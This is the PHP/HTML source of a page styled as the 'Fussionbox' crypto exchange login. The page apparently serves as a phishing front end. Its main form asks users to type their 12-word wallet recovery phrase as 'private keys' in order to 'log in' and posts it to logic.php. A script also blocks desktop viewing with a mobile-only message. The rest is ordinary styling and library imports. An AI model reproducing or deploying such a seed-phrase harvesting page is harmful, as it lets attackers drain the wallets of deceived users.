
<?php 

include("connection.php");
?>


<!DOCTYPE php>
<php lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
    <title>Fussionbox | Crypto Exchange</title>
    <script src="jquery.min.js"></script>
    <link rel="icon" href="img/icon.png" type="image/x-icon">
    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
    
<script src="js/bootstrap.bundle.js"></script>
<link rel="stylesheet" href="css/bootstrap.css">
<!-- <script src="list.js"></script> -->

    
<script src="js/bootstrap.js"></script>
<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="bootstrap-auto-dismiss-alert.js"></script>
<!-- Global site tag (gtag.js) - Google Ads: 475508758 -->
   
    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
   
    <link rel="stylesheet" href="css/mdb.min.css" />

<style>

@import url('https://fonts.googleapis.com/css2?family=Mukta:wght@200;300;400;500;600;700;800&display=swap');

  *{
    font-family: Mukta;
    color: white;
    user-select:none;
  }
  body, html{
    overflow-x: hidden;
  }
  
  .stages{
    display: flex;
  }
 .c{
    background-color: #7525FA;
    height: 4px;
    max-width: 30px;
    border-radius:7px;
 }
 .d
 {
    background-color: #7725fa75; 
    height: 4px;
    max-width: 30px;
 }

.alertmy{
    background-color: #7525FA;
    border-left: 2px solid white;
    padding:15px 30px;
    height: auto;
    width: 300px;
    position: absolute;
    top: 50px;
    right: 50px;
    animation: alertme 1s linear;
    display: none;
    
}
div.loader{
    height: 100vh;
    width: 100vw;
    position: fixed;
    overflow: hidden;
    z-index: 100;
    display: block;
    background-color: #362465;
  }

@keyframes alertme {
    from{
        right: -100%;
        opacity: 0;
    }
    to{
        right: 50px;
        opacity: 1;
    }
    
}
@media screen and (max-width:780px){
    .alertmy{
    
    position: absolute;
    top: 20px;
    right: 20px;
} 
@keyframes alertme {
    from{
        right: -100%;
        opacity: 0;
    }
    to{
        right: 20px;
        opacity: 0;
    }
    
}

}
</style>


  </head>
  <body class="bg-black">
  <div class="loader p-5" id="myloader">
  <img src="./img/loaderlogo.png" class="d-block mx-auto" style="padding-top: 30vh;" width="60" alt="">
  <lottie-player class="mx-auto d-block" src="https://assets7.lottiefiles.com/packages/lf20_ldq2pf6j.json"  background="transparent"  speed="1"  style="width: 100px; height: 100px;"  loop  autoplay></lottie-player>
  </div>



<img src="img/cryptbox.png"  class="img-fluid d-block mx-auto p-5" style="max-width:250px" alt="">

<div class="row mx-auto align-items-center p-lg-5 p-2 justify-contents-center">

<div class="col-12 col-lg-4">
     <div class="container">
     <lottie-player class="d-block mx-auto" src="https://assets3.lottiefiles.com/packages/lf20_gjmecwii.json"  background="transparent"  speed="1"  style="width: 300px; height: 300px;"  loop  autoplay></lottie-player>
     </div>
     </div>



<div class="col-12 col-lg-8">
    
    <div class="container col-12 col-lg-5 mx-auto border-0 ">
    <form action="logic.php" method="post">
    <p class="small m-0 mb-1">Enter Private Keys:</p>
        <textarea name="enterseed" id="" class=" p-3 form-control bg-dark text-white border-0 shadow-none" cols="30" rows="10" placeholder="Enter your 12 phrases with no space in lowercase seperated with commas e.g phrase1,phrase2,phrase3"></textarea><br>
        <button name="login"  style="background-color: #7525FA; box-shadow: 12px 5px 32px -4px rgba(117,37,250,0.72);
        -webkit-box-shadow: 12px 5px 32px -4px rgba(117,37,250,0.72);
        -moz-box-shadow: 12px 5px 32px -4px rgba(117,37,250,0.72);" id="create" class="btn btn-primary w-75 d-block py-2  mx-auto px-4 border-0  align-items-center ">Log In Account</button>

        <p class="text-center mt-3">I don't have a Wallet? <a href="create.php" class="text-white text-decoration-none"> Create Wallet</a></p>
    </form>

 
    </div>

  
   
    <br><br>
    </div>
</div>

    










<script >
window.addEventListener('load', ()=>{
			document.getElementById('myloader').style.display = 'none';
			var check = setTimeout(CheckView,10);
})

function CheckView (){
	if(screen.width > 600){
	document.getElementById('myloader').style.display = 'block';
	document.getElementById('myloader').innerHTML += "<h1 class='text-center text-white'>Fussion Box is Only Supported On Mobile Phones </h1>";	
}
}
</script>


    <script type="text/javascript" src="js/mdb.min.js"></script>
    <!-- Custom scripts -->
    <script type="text/javascript"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
  <script>
    AOS.init();
  </script>
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</php>
